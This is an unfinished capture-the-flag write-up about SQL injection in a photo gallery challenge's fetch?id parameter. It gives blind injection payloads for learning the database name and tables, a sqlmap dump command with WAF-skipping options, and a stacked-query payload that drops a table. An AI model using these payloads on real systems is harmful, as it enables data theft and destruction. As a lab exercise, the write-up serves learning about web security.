This ctf took me quit a while to figure out. I personally found flag 1 first then flag 0 and I am still working on flag 2.


## Flag 0 – SQL Injection

Navigating the website you will notice that there is not a lot to do. We can't buy anything click on anything or comment. Checking out the source code of the website we see that the images are being loaded from the url `/fetch?id=X` (X is a placeholder for a number). Browsing to that url you will see a site with the raw image data. The interesting part however is the url itself. Looking at the url parameter and replacing the value with sth like 2-1 for example shows that the application is vulnerable to sql injection. Great!

### Blind injection
Blind sql injeciton can be used to gain information about the database layout. For example using the following query shows the length of the db_name :

```
.../fetch?id=4 OR LENGTH(database()) = 6
```
from there it is possible to guess the name using queries similar to the following:
```
.../fetch?id=4 or database() LIKE '______'
```
You can replace a single '_' with any sign in order to guess the sign at that position. Once you guessed the correct value you can replace the next underscore. The underscore characters serves as a wildcard for a single character. It is important to use 6 underscores since that is the length of the databse name.

After obtaining the database name the following query can be used to find out the number of tables in the database:
```
.../fetch?id=1 AND (SELECT Count(*) FROM information_schema.tables WHERE table_schema=database())=2
```



### Union based injection



## WIP

DB Layout:
...db_name: "level5" 
...num_of_tables : 2
...tables_names : albums, photos


To dump it all :
sqlmap -u "http://35.237.57.141:5001/b09a24aa14/fetch?id=2" --method GET --dump -D level5 -T photos -p id --code 200 --skip-waf --random-agent --threads 10 -o

Flag 2 – Stacked Queries
Drop a table: (breaks app)
http://35.196.135.216/5ddb86c66f/fetch?id=1;%20DROP%20Table%20photos



